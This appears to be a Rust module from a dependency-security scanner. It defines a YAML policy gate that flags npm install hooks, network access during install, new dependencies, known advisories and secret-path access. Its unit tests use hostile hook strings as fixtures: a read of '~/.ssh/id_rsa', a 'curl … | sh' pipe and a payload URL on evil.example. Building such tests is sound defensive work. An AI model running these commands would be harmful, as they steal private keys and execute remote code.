//! YAML policy gate.
//!
//! Warn-first mode reports violations but does not fail the process. Enforce
//! mode keeps the configured action. The scanner never rewrites the repository.

use crate::advisories::{AdvisoryReport, Severity};
use crate::heuristics::HeuristicFinding;
use crate::hooks::HookFinding;
use crate::resolve::Graph;
use crate::{Error, Result};
use noyalib::from_str;
use serde::Deserialize;
use std::collections::BTreeSet;
use std::fs;
use std::path::Path;

const DEFAULT_YAML: &str = include_str!("default-policy.yaml");

/// How the gate treats configured fail and review actions.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    /// Baseline: every violation is a warning. Exit code is 0 or 1.
    Warn,
    /// Configured actions apply. Fail exits 2.
    Enforce,
}

/// Configured or effective gate action.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Action {
    /// The signal is ignored.
    Allow,
    /// Report, exit 1 in enforce mode.
    Warn,
    /// Needs a human review. Exit 1 in enforce mode.
    Review,
    /// Block the build. Exit 2 in enforce mode.
    Fail,
}

/// Overall gate result.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Outcome {
    /// No violations.
    Ok,
    /// Warnings or reviews, or warn-first mode.
    Warn,
    /// At least one effective fail.
    Fail,
}

/// Loaded policy.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Policy {
    /// Document version. Only `1` is accepted.
    pub version: u32,
    /// Warn-first or enforce.
    pub mode: Mode,
    /// The default rules.
    pub rules: PolicyRules,
}

/// Rule table.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PolicyRules {
    /// Install hooks are allowed only for listed package names.
    pub install_scripts: InstallScriptsRule,
    /// Network access from an install hook.
    pub no_outbound_build: OutboundRule,
    /// Direct dependencies absent from the baseline.
    pub new_dependencies: ActionRule,
    /// Advisories at or above a severity.
    pub known_vulnerable: VulnerableRule,
    /// Secret-path heuristic.
    pub secret_path_access: ActionRule,
    /// Offline scans with cache misses are not treated as a clean vulnerability check.
    #[serde(default = "default_advisory_coverage")]
    pub advisory_coverage: ActionRule,
}

fn default_advisory_coverage() -> ActionRule {
    ActionRule {
        action: Action::Warn,
    }
}

/// Allowlist rule.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct InstallScriptsRule {
    /// Action when the package is not listed.
    pub action: Action,
    /// Package names that may run install scripts.
    #[serde(default)]
    pub allow: Vec<String>,
}

/// Outbound rule with an optional domain allowlist.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct OutboundRule {
    /// Action when the hook is not allowlisted.
    pub action: Action,
    /// Hosts that may be contacted. Empty means none are allowed.
    #[serde(default)]
    pub allow_domains: Vec<String>,
}

/// A rule that is only an action.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ActionRule {
    /// Configured action.
    pub action: Action,
}

/// Known-vulnerability rule.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct VulnerableRule {
    /// Configured action.
    pub action: Action,
    /// Minimum advisory severity that trips the rule.
    pub min_severity: Severity,
}

/// One policy hit.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Violation {
    /// Stable rule name.
    pub rule: &'static str,
    /// Package name, when the hit is package-scoped.
    pub package_name: String,
    /// Package version.
    pub package_version: String,
    /// Action from the policy file.
    pub configured_action: Action,
    /// Action after warn-first downgrade.
    pub effective_action: Action,
    /// German explanation.
    pub message: String,
}

/// Gate decision.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Decision {
    /// Mode that was applied.
    pub mode: Mode,
    /// Coarse outcome.
    pub outcome: Outcome,
    /// Process exit code: 0 ok, 1 warn, 2 fail.
    pub exit_code: u8,
    /// Violations, sorted by rule and package.
    pub violations: Vec<Violation>,
    /// Non-blocking notes, for example a missing baseline.
    pub notes: Vec<String>,
}

/// Inputs the gate reads. It does not fetch or execute anything.
pub struct Evaluation<'a> {
    /// Dependency graph, used for direct dependencies.
    pub graph: &'a Graph,
    /// Install hooks.
    pub hooks: &'a [HookFinding],
    /// Heuristic hits.
    pub heuristics: &'a [HeuristicFinding],
    /// Advisory matches.
    pub advisories: &'a AdvisoryReport,
    /// `name@version` lines. `None` skips the new-dependency rule.
    pub baseline: Option<&'a BTreeSet<String>>,
}

impl Policy {
    /// Built-in warn-first policy.
    pub fn default_policy() -> Result<Self> {
        parse_policy_str(DEFAULT_YAML, "default-policy.yaml")
    }

    /// Replace the mode without editing the file.
    #[must_use]
    pub fn with_mode(mut self, mode: Mode) -> Self {
        self.mode = mode;
        self
    }
}

/// Load a policy file.
pub fn load_policy(path: &Path) -> Result<Policy> {
    let text = fs::read_to_string(path).map_err(|err| Error::io(path, err))?;
    parse_policy_str(&text, &path.display().to_string())
}

/// Parse policy YAML.
pub fn parse_policy_str(text: &str, origin: &str) -> Result<Policy> {
    let policy: Policy = from_str(text).map_err(|err| Error::Policy {
        path: origin.to_owned(),
        message: err.to_string(),
    })?;
    if policy.version != 1 {
        return Err(Error::Policy {
            path: origin.to_owned(),
            message: format!("unsupported policy version {}", policy.version),
        });
    }
    Ok(policy)
}

/// Parse a baseline file. Blank lines and `#` comments are ignored.
#[must_use]
pub fn parse_baseline(text: &str) -> BTreeSet<String> {
    text.lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(str::to_owned)
        .collect()
}

/// Render direct dependencies as `name@version` lines.
#[must_use]
pub fn render_baseline(graph: &Graph) -> String {
    let mut lines: Vec<_> = graph
        .nodes
        .iter()
        .filter(|node| node.direct)
        .map(|node| format!("{}@{}", node.name, node.version))
        .collect();
    lines.sort();
    lines.push(String::new());
    lines.join("\n")
}

/// Apply the policy. Warn-first downgrades fail and review to warn.
#[must_use]
pub fn decide(policy: &Policy, input: Evaluation<'_>) -> Decision {
    let mut violations = Vec::new();
    let mut notes = Vec::new();
    consider_install_scripts(policy, input.hooks, &mut violations);
    consider_outbound(policy, input.heuristics, &mut violations);
    consider_new_dependencies(
        policy,
        input.graph,
        input.baseline,
        &mut violations,
        &mut notes,
    );
    consider_vulnerabilities(policy, input.advisories, &mut violations);
    consider_advisory_coverage(policy, input.advisories, &mut violations);
    consider_secrets(policy, input.heuristics, &mut violations);
    for violation in &mut violations {
        violation.effective_action = effective(policy.mode, violation.configured_action);
    }
    violations.sort_by(|left, right| {
        left.rule
            .cmp(right.rule)
            .then(left.package_name.cmp(&right.package_name))
            .then(left.package_version.cmp(&right.package_version))
            .then(left.message.cmp(&right.message))
    });
    let exit_code = exit_code(policy.mode, &violations);
    Decision {
        mode: policy.mode,
        outcome: outcome(exit_code),
        exit_code,
        violations,
        notes,
    }
}

fn consider_install_scripts(
    policy: &Policy,
    hooks: &[HookFinding],
    violations: &mut Vec<Violation>,
) {
    let rule = &policy.rules.install_scripts;
    if rule.action == Action::Allow {
        return;
    }
    for hook in hooks {
        if rule.allow.iter().any(|name| name == &hook.package_name) {
            continue;
        }
        violations.push(Violation {
            rule: "install_scripts",
            package_name: hook.package_name.clone(),
            package_version: hook.package_version.clone(),
            configured_action: rule.action,
            effective_action: rule.action,
            message: format!(
                "Install-Hook `{}` in {}@{} ist nicht auf der Allowlist.",
                hook.hook, hook.package_name, hook.package_version
            ),
        });
    }
}

fn consider_outbound(
    policy: &Policy,
    heuristics: &[HeuristicFinding],
    violations: &mut Vec<Violation>,
) {
    let rule = &policy.rules.no_outbound_build;
    if rule.action == Action::Allow {
        return;
    }
    for finding in heuristics {
        if finding.rule_id != "LW-H003" && finding.rule_id != "LW-H004" {
            continue;
        }
        if domain_allowed(&finding.evidence, &rule.allow_domains) {
            continue;
        }
        violations.push(Violation {
            rule: "no_outbound_build",
            package_name: finding.package_name.clone(),
            package_version: finding.package_version.clone(),
            configured_action: rule.action,
            effective_action: rule.action,
            message: format!(
                "Hook `{}` in {}@{} spricht während der Installation mit dem Netzwerk ({}).",
                finding.hook, finding.package_name, finding.package_version, finding.rule_id
            ),
        });
    }
}

fn consider_new_dependencies(
    policy: &Policy,
    graph: &Graph,
    baseline: Option<&BTreeSet<String>>,
    violations: &mut Vec<Violation>,
    notes: &mut Vec<String>,
) {
    let rule = &policy.rules.new_dependencies;
    if rule.action == Action::Allow {
        return;
    }
    let Some(baseline) = baseline else {
        notes.push(
            "new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv."
                .to_owned(),
        );
        return;
    };
    for node in graph.nodes.iter().filter(|node| node.direct) {
        let key = format!("{}@{}", node.name, node.version);
        if baseline.contains(&key) || baseline.contains(&node.name) {
            continue;
        }
        violations.push(Violation {
            rule: "new_dependencies",
            package_name: node.name.clone(),
            package_version: node.version.clone(),
            configured_action: rule.action,
            effective_action: rule.action,
            message: format!(
                "Direkte Abhängigkeit {}@{} fehlt in der Baseline und braucht ein Review.",
                node.name, node.version
            ),
        });
    }
}

fn consider_vulnerabilities(
    policy: &Policy,
    advisories: &AdvisoryReport,
    violations: &mut Vec<Violation>,
) {
    let rule = &policy.rules.known_vulnerable;
    if rule.action == Action::Allow {
        return;
    }
    for package in &advisories.packages {
        for advisory in &package.advisories {
            if advisory.severity < rule.min_severity {
                continue;
            }
            violations.push(Violation {
                rule: "known_vulnerable",
                package_name: package.name.clone(),
                package_version: package.version.clone(),
                configured_action: rule.action,
                effective_action: rule.action,
                message: format!(
                    "Bekannte Schwachstelle {} in {}@{} hat die Schwere {} (Schwelle {}).",
                    advisory.id,
                    package.name,
                    package.version,
                    severity_de(advisory.severity),
                    severity_de(rule.min_severity)
                ),
            });
        }
    }
}

fn consider_advisory_coverage(
    policy: &Policy,
    advisories: &AdvisoryReport,
    violations: &mut Vec<Violation>,
) {
    let rule = &policy.rules.advisory_coverage;
    if rule.action == Action::Allow {
        return;
    }
    if advisories.offline && advisories.cache_misses > 0 {
        violations.push(Violation {
            rule: "advisory_coverage",
            package_name: String::new(),
            package_version: String::new(),
            configured_action: rule.action,
            effective_action: rule.action,
            message: format!(
                "{} Pakete nicht gegen OSV geprüft (offline, kein/stale Cache).",
                advisories.cache_misses
            ),
        });
    }
}

fn consider_secrets(
    policy: &Policy,
    heuristics: &[HeuristicFinding],
    violations: &mut Vec<Violation>,
) {
    let rule = &policy.rules.secret_path_access;
    if rule.action == Action::Allow {
        return;
    }
    for finding in heuristics
        .iter()
        .filter(|finding| finding.rule_id == "LW-H006")
    {
        violations.push(Violation {
            rule: "secret_path_access",
            package_name: finding.package_name.clone(),
            package_version: finding.package_version.clone(),
            configured_action: rule.action,
            effective_action: rule.action,
            message: format!(
                "Hook `{}` in {}@{} greift auf einen Secret-Pfad oder eine Secret-Variable zu.",
                finding.hook, finding.package_name, finding.package_version
            ),
        });
    }
}

/// Host allowlist for outbound hook evidence.
///
/// Evidence is clipped at 120 characters and then ends with `…`. A second host
/// past that clip is invisible here, so clipped evidence is never allowlisted.
/// A short hook whose only hosts are listed is suppressed.
fn domain_allowed(evidence: &str, allow: &[String]) -> bool {
    if allow.is_empty() || evidence.contains('…') {
        return false;
    }
    let hosts = extract_hosts(evidence);
    !hosts.is_empty()
        && hosts
            .iter()
            .all(|host| allow.iter().any(|item| item == host))
}

fn extract_hosts(evidence: &str) -> Vec<String> {
    let mut hosts = Vec::new();
    for token in evidence.split_whitespace() {
        let Some(rest) = token
            .strip_prefix("https://")
            .or_else(|| token.strip_prefix("http://"))
        else {
            continue;
        };
        let host = rest.split(['/', '?', '#']).next().unwrap_or(rest);
        let host = host.trim_end_matches('.');
        if !host.is_empty() {
            hosts.push(host.to_owned());
        }
    }
    hosts
}

fn effective(mode: Mode, action: Action) -> Action {
    match (mode, action) {
        (Mode::Warn, Action::Fail | Action::Review) => Action::Warn,
        _ => action,
    }
}

fn exit_code(mode: Mode, violations: &[Violation]) -> u8 {
    if violations.is_empty() {
        return 0;
    }
    match mode {
        Mode::Warn => 1,
        Mode::Enforce => {
            if violations
                .iter()
                .any(|violation| violation.configured_action == Action::Fail)
            {
                2
            } else {
                1
            }
        }
    }
}

fn outcome(exit_code: u8) -> Outcome {
    match exit_code {
        0 => Outcome::Ok,
        1 => Outcome::Warn,
        _ => Outcome::Fail,
    }
}

fn severity_de(severity: Severity) -> &'static str {
    match severity {
        Severity::Critical => "kritisch",
        Severity::High => "hoch",
        Severity::Medium => "mittel",
        Severity::Low => "niedrig",
        Severity::Unknown => "unbekannt",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::advisories::{Advisory, AdvisoryReport, PackageAdvisories};
    use crate::heuristics::evaluate;
    use crate::hooks::{HookFinding, HookProvenance};
    use crate::ingest::parse_lockfile_str;
    use crate::resolve::resolve;

    fn hook(name: &str, raw: &str) -> HookFinding {
        HookFinding {
            package_name: name.to_owned(),
            package_version: "1.0.0".to_owned(),
            package_path: format!("node_modules/{name}"),
            hook: "postinstall".to_owned(),
            location: "package.json#scripts.postinstall".to_owned(),
            raw: raw.to_owned(),
            provenance: HookProvenance::Manifest,
        }
    }

    fn empty_advisories() -> AdvisoryReport {
        AdvisoryReport {
            packages: Vec::new(),
            cache_hits: 0,
            cache_misses: 0,
            offline: true,
        }
    }

    fn graph() -> Graph {
        let lock = parse_lockfile_str(
            r#"{
              "name": "app",
              "version": "1.0.0",
              "lockfileVersion": 3,
              "packages": {
                "": { "name": "app", "version": "1.0.0", "dependencies": { "left-pad": "1.0.0", "fresh": "2.0.0" } },
                "node_modules/left-pad": { "version": "1.0.0" },
                "node_modules/fresh": { "version": "2.0.0" }
              }
            }"#,
            "policy.json",
        )
        .unwrap();
        resolve(&lock)
    }

    #[test]
    fn default_policy_is_warn_first_and_loads() {
        let policy = Policy::default_policy().unwrap();
        assert_eq!(policy.mode, Mode::Warn);
        assert_eq!(policy.rules.install_scripts.action, Action::Warn);
        assert_eq!(policy.rules.no_outbound_build.action, Action::Fail);
        assert_eq!(policy.rules.known_vulnerable.min_severity, Severity::High);
        assert_eq!(policy.rules.advisory_coverage.action, Action::Warn);
        assert!(policy.rules.install_scripts.allow.is_empty());
    }

    #[test]
    fn custom_policy_without_advisory_coverage_still_loads() {
        let policy = parse_policy_str(
            r#"
            version: 1
            mode: enforce
            rules:
              install_scripts: { action: allow }
              no_outbound_build: { action: allow }
              new_dependencies: { action: allow }
              known_vulnerable: { action: allow, min_severity: high }
              secret_path_access: { action: allow }
            "#,
            "legacy.yaml",
        )
        .unwrap();
        assert_eq!(policy.rules.advisory_coverage.action, Action::Warn);
    }

    #[test]
    fn offline_cache_miss_is_an_advisory_coverage_violation() {
        let policy = Policy::default_policy().unwrap();
        let advisories = AdvisoryReport {
            packages: Vec::new(),
            cache_hits: 0,
            cache_misses: 2,
            offline: true,
        };
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[],
                heuristics: &[],
                advisories: &advisories,
                baseline: None,
            },
        );
        assert!(decision.exit_code >= 1);
        let coverage = decision
            .violations
            .iter()
            .find(|item| item.rule == "advisory_coverage")
            .expect("coverage violation");
        assert_eq!(
            coverage.message,
            "2 Pakete nicht gegen OSV geprüft (offline, kein/stale Cache)."
        );
        assert!(decision.notes.iter().all(|note| note != &coverage.message));
    }

    #[test]
    fn warn_mode_downgrades_a_failing_advisory() {
        let policy = Policy::default_policy().unwrap();
        let advisories = AdvisoryReport {
            packages: vec![PackageAdvisories {
                package_path: "node_modules/lodash".to_owned(),
                name: "lodash".to_owned(),
                version: "4.17.20".to_owned(),
                advisories: vec![Advisory {
                    id: "GHSA-35jh-r3h4-6jhm".to_owned(),
                    aliases: vec!["CVE-2021-23337".to_owned()],
                    summary: "Fixture".to_owned(),
                    severity: Severity::High,
                    cvss_score: Some("7.2".to_owned()),
                    url: "https://example.invalid/ghsa".to_owned(),
                }],
            }],
            cache_hits: 0,
            cache_misses: 0,
            offline: true,
        };
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[],
                heuristics: &[],
                advisories: &advisories,
                baseline: None,
            },
        );
        assert_eq!(decision.exit_code, 1);
        assert_eq!(decision.outcome, Outcome::Warn);
        assert_eq!(decision.violations[0].configured_action, Action::Fail);
        assert_eq!(decision.violations[0].effective_action, Action::Warn);
        assert!(decision.notes.iter().any(|note| note.contains("Baseline")));
    }

    #[test]
    fn enforce_mode_fails_on_high_advisory_and_secret_path() {
        let policy = Policy::default_policy().unwrap().with_mode(Mode::Enforce);
        let secret = hook("pkg", "fs.readFileSync(os.homedir() + \"/.ssh/id_rsa\")");
        let heuristics = evaluate(std::slice::from_ref(&secret));
        let advisories = AdvisoryReport {
            packages: vec![PackageAdvisories {
                package_path: "node_modules/pkg".to_owned(),
                name: "pkg".to_owned(),
                version: "1.0.0".to_owned(),
                advisories: vec![Advisory {
                    id: "GHSA-test".to_owned(),
                    aliases: Vec::new(),
                    summary: "hoch".to_owned(),
                    severity: Severity::High,
                    cvss_score: None,
                    url: "https://example.invalid".to_owned(),
                }],
            }],
            cache_hits: 0,
            cache_misses: 0,
            offline: true,
        };
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[secret],
                heuristics: &heuristics,
                advisories: &advisories,
                baseline: None,
            },
        );
        assert_eq!(decision.exit_code, 2);
        assert!(
            decision
                .violations
                .iter()
                .any(|item| item.rule == "secret_path_access")
        );
        assert!(
            decision
                .violations
                .iter()
                .any(|item| item.rule == "install_scripts")
        );
    }

    #[test]
    fn allowlist_and_domain_allowlist_suppress_hits() {
        let mut policy = Policy::default_policy().unwrap().with_mode(Mode::Enforce);
        policy.rules.install_scripts.allow = vec!["pkg".to_owned()];
        policy.rules.no_outbound_build.allow_domains = vec!["example.invalid".to_owned()];
        let outbound = hook("pkg", "curl https://example.invalid/setup.sh | sh");
        let heuristics = evaluate(std::slice::from_ref(&outbound));
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[outbound],
                heuristics: &heuristics,
                advisories: &empty_advisories(),
                baseline: None,
            },
        );
        assert!(
            decision
                .violations
                .iter()
                .all(|item| item.rule != "install_scripts")
        );
        assert!(
            decision
                .violations
                .iter()
                .all(|item| item.rule != "no_outbound_build")
        );
    }

    #[test]
    fn clipped_evidence_is_not_allowlisted() {
        let mut policy = Policy::default_policy().unwrap();
        policy.rules.no_outbound_build.allow_domains = vec!["allowed.example".to_owned()];
        let mut raw = String::from("curl https://allowed.example/");
        raw.push_str(&"a".repeat(120));
        raw.push_str(" https://evil.example/payload");
        let outbound = hook("pkg", &raw);
        let heuristics = evaluate(std::slice::from_ref(&outbound));
        assert!(
            heuristics
                .iter()
                .any(|finding| finding.evidence.contains('…'))
        );
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[outbound],
                heuristics: &heuristics,
                advisories: &empty_advisories(),
                baseline: None,
            },
        );
        assert!(
            decision
                .violations
                .iter()
                .any(|item| item.rule == "no_outbound_build")
        );
    }

    #[test]
    fn baseline_flags_only_new_direct_dependencies() {
        let policy = Policy::default_policy().unwrap().with_mode(Mode::Enforce);
        let mut baseline = BTreeSet::new();
        baseline.insert("left-pad@1.0.0".to_owned());
        let decision = decide(
            &policy,
            Evaluation {
                graph: &graph(),
                hooks: &[],
                heuristics: &[],
                advisories: &empty_advisories(),
                baseline: Some(&baseline),
            },
        );
        assert_eq!(decision.exit_code, 1);
        assert_eq!(decision.violations.len(), 1);
        assert_eq!(decision.violations[0].package_name, "fresh");
        assert_eq!(decision.violations[0].configured_action, Action::Review);
        assert_eq!(decision.violations[0].effective_action, Action::Review);
    }

    #[test]
    fn custom_policy_rejects_unknown_version() {
        let text = r#"
version: 9
mode: warn
rules:
  install_scripts: { action: warn }
  no_outbound_build: { action: fail }
  new_dependencies: { action: review }
  known_vulnerable: { action: fail, min_severity: high }
  secret_path_access: { action: fail }
"#;
        let err = parse_policy_str(text, "bad.yaml").unwrap_err();
        assert!(matches!(err, Error::Policy { .. }), "{err}");
        assert!(err.to_string().contains("version"));
    }
}
